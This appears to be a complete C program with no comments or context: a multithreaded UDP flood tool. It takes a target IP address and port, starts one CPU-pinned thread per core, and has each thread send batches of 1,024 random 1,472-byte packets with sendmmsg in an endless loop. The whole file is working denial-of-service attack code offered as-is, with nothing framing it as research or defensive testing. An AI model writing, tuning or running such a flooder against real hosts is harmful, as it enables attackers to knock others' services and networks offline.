#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <pthread.h>
#include <time.h>
#include <errno.h>
#include <sched.h>

#define P_SIZE 1472
#define B_SIZE 1024
#define S_BUF 2147483647 

struct t_data {
    int t_id;
    struct sockaddr_in t_addr;
    long max_t;
};

void *a_thread(void *arg) {
    struct t_data *d = (struct t_data *)arg;
    int s_fd;
    char p_buf[P_SIZE];
    cpu_set_t cpuset;

    CPU_ZERO(&cpuset);
    CPU_SET(d->t_id % d->max_t, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);

    s_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (s_fd < 0) pthread_exit(NULL);

    int buf_size = S_BUF;
    setsockopt(s_fd, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));

    for (int i = 0; i < P_SIZE; i++) {
        p_buf[i] = rand() & 0xFF;
    }

    struct mmsghdr msgs[B_SIZE];
    struct iovec iovecs[B_SIZE];
    memset(msgs, 0, sizeof(msgs));

    for (int i = 0; i < B_SIZE; i++) {
        iovecs[i].iov_base = p_buf;
        iovecs[i].iov_len = P_SIZE;
        msgs[i].msg_hdr.msg_iov = &iovecs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_name = &d->t_addr;
        msgs[i].msg_hdr.msg_namelen = sizeof(d->t_addr);
    }

    while (1) {
        sendmmsg(s_fd, msgs, B_SIZE, 0);
    }

    close(s_fd);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc < 3) return 1;

    srand(time(NULL));
    long t_cnt = sysconf(_SC_NPROCESSORS_ONLN);

    struct sockaddr_in t_addr;
    memset(&t_addr, 0, sizeof(t_addr));
    t_addr.sin_family = AF_INET;
    t_addr.sin_port = htons(atoi(argv[2]));
    if (inet_pton(AF_INET, argv[1], &t_addr.sin_addr) <= 0) return 1;

    pthread_t *threads = malloc(t_cnt * sizeof(pthread_t));
    struct t_data *t_args = malloc(t_cnt * sizeof(struct t_data));

    for (long i = 0; i < t_cnt; i++) {
        t_args[i].t_id = i;
        t_args[i].max_t = t_cnt;
        memcpy(&t_args[i].t_addr, &t_addr, sizeof(t_addr));
        pthread_create(&threads[i], NULL, a_thread, (void *)&t_args[i]);
    }

    for (long i = 0; i < t_cnt; i++) {
        pthread_join(threads[i], NULL);
    }

    free(threads);
    free(t_args);
    return 0;
}
